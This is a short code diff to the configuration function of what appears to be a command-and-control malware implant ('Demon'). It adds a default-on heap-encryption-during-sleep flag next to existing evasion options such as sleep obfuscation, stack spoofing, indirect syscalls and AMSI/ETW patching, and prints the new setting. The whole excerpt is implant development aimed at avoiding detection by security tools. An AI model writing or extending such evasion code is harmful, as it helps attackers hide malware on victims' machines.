@@ -650,18 +650,25 @@ VOID DemonConfig()
     Instance->Config.Implant.DownloadChunkSize  = 0xfc00; /* 63k, needs to be less than PIPE_BUFFER_MAX */
 #endif
 
+    /* ARC-04: heap encryption during sleep — default ON.
+     * When the teamserver gains HeapEnc profile-key support it will be
+     * appended to the config blob and parsed here instead of hardcoded. */
+    Instance->Config.Implant.HeapEnc = TRUE;
+
     PRINTF(
         "[CONFIG] Sleep Obfuscation: \n"
         " - Technique: %d \n"
         " - Stack Dup: %s \n"
         "[CONFIG] ProxyLoading: %d\n"
         "[CONFIG] SysIndirect : %s\n"
-        "[CONFIG] AmsiEtwPatch: %d\n",
+        "[CONFIG] AmsiEtwPatch: %d\n"
+        "[CONFIG] HeapEnc     : %s\n",
         Instance->Config.Implant.SleepMaskTechnique,
         Instance->Config.Implant.StackSpoof ? "TRUE" : "FALSE",
         Instance->Config.Implant.ProxyLoading,
         Instance->Config.Implant.SysIndirect ? "TRUE" : "FALSE",
-        Instance->Config.Implant.AmsiEtwPatch
+        Instance->Config.Implant.AmsiEtwPatch,
+        Instance->Config.Implant.HeapEnc ? "TRUE" : "FALSE"
     )
 
 #ifdef TRANSPORT_HTTP
